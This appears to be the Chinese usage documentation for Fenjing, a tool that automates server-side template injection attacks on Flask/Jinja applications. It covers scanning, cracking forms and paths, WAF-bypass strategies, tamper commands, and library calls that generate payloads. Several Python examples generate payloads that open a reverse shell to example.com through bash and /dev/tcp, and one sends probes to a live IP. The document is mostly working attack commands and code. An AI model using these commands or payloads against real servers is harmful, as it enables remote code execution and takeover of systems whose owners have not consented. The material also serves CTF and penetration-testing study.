## 启动webui

webui不支持自定义Headers和Cookie等特性，如果需要更灵活的使用方式请直接使用命令行或者作为库调用
执行`python -m fenjing webui`并访问[http://127.0.0.1:11451](http://127.0.0.1:11451)即可
指定host和port：`python -m fenjing webui --host '127.0.0.1' --port 1145`

## 作为命令行脚本使用

扫描网站：`python -m fenjing scan --url 'http://xxx.xxx/'`

攻击对应的表单：
- `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name`
- 也可以指定多个input：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name,email`
- 指定攻击成功后执行的命令
    - 不指定则进入交互模式
    - `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --exec-cmd 'ls /'`

攻击对应的路径：
- `python -m fenjing crack-path --url 'http://xxx.xxx/hello/'`
- 只需要提供路径的前缀即可

从文本文件中读取HTTP请求：
- `python -m fenjing crack-request -f req.txt --host '127.0.0.1' --port 5000`
- 需要提供HTTP请求文件的路径、目标的IP和端口

通用设置
- 指定请求间隔：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --interval 0.1`
- 指定请求时使用的UA：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --user-agent 'Aaa/1.1'`
- 指定Header：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --header 'Aaa: Bbb' --header 'Ccc: Ddd'`
- 指定Cookie：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --cookie 'name1=value1; name2=value2'`
- 指定代理：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --proxy 'http://127.0.0.1:7890'`
- 指定额外的GET参数：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --extra-params 'a=1&b=2'`
- 指定额外的POST参数：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --extra-data 'a=1&b=2'`
- 指定分析模式
    - `--detect-mode`：检测模式，可为accurate或fast
    - 示例：`python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --detect-mode fast`
    - 在开始尝试触发WAF, 获取WAF页面对应hash时：
        - accurate模式会一个接一个地发送尽可能多的payload
        - fast模式会将多个payload组合在一起发送，
    - 在生成payload时：
        - accurate模式会先从最简单的方法试起
        - fast模式会先尝试使用复杂但通常更能绕过WAF的方法
- 指定WAF替换危险关键字时的行为：
    - 使用`--replaced-keyword-strategy`选项
    - `avoid`: 避免使用会被WAF替换的关键字
    - `doubletapping`: 进行双写（如`class`变成`clclassass`）
    - `ignore`: 忽略，认为WAF不会对这些关键字做任何事
    - `python -m fenjing crack --url 'http://xxx.xxx' --method GET --inputs name --replaced-keyword-strategy doubletapping`
- 指定模板渲染环境
    - 使用`--environment`选项
    - `flask`: （默认）模板在`render_template_string`等flask提供的函数中渲染，此时会使用`g`, `config`等flask提供的变量生成payload
    - `jinja`: 模板使用jinja内置的`Template`编译并渲染，相关代码类似`Template(s).render()`，此时避免使用任何普通jinja环境之外提供的变量生成payload

### Tamper Cmd的使用

如果指定了`--tamper-cmd`参数，焚靖在每次提交payload时会使用指定的命令打开一个子进程，向这个子进程的标准输入传入payload, 并将子进程的输出作为编码后的结果进行提交。

例如：Linux中有一个命令行程序`base64`，它会从输入中读取内容，进行base64编码并输出

我们就可以使用`--tamper-cmd 'base64'`指定使用这个命令编码payload

同样道理，`--tamper-cmd 'base64|rev'`就是先进行base64编码再将内容反转

也可以使用python来自定义编码方式，例子如下：

先新建一个`encoder.py`，写入以下内容：

```python
s = input()
print(s[::-1], end = "") # 将payload反转
```

然后指定`--tamper-cmd 'python encoder.py'`就可以了


## 作为库使用

### 根据WAF函数生成shell指令对应的payload

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    # config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    # print(f"{config_payload=}")
```

### 在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload

比如说如果提交的payload被WAF后，WAF页面含有"BAD"这三个字母，那么可以这么写：

```python
import functools
import time
import requests
from fenjing import exec_cmd_payload


URL = "http://10.137.0.28:5000"


@functools.lru_cache(1000)
def waf(payload: str):  # 如果字符串s可以通过waf则返回True, 否则返回False
    time.sleep(0.02) # 防止请求发送过多
    resp = requests.get(URL, timeout=10, params={"name": payload})
    return "BAD" not in resp.text


if __name__ == "__main__":
    shell_payload, will_print = exec_cmd_payload(
        waf, 'bash -c "bash -i >& /dev/tcp/example.com/3456 0>&1"'
    )
    if not will_print:
        print("这个payload不会产生回显！")

    print(f"{shell_payload=}")
```


### 让生成器学会使用新的变量

[参考](https://github.com/Marven11/Fenjing/issues/4)

比如说你想让生成器学会使用新的变量`aaa`，它的值是100，需要在payload的前面加上`{%set aaa=0x64%}`，那你只需要这么写

```python
from fenjing.full_payload_gen import FullPayloadGen
from fenjing.const import OS_POPEN_READ
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 这个函数因题目而定
    blacklist = [
        "00", "1", "3", "5", "7", "9"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    full_payload_gen = FullPayloadGen(waf)
    full_payload_gen.do_prepare()
    full_payload_gen.add_context_variable("{%set aaa=0x64%}", {"aaa": 100})
    shell_payload, will_print = full_payload_gen.generate(OS_POPEN_READ, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    if not will_print:
        print("这个payload不会产生回显")
    print(f"{shell_payload=}")
```
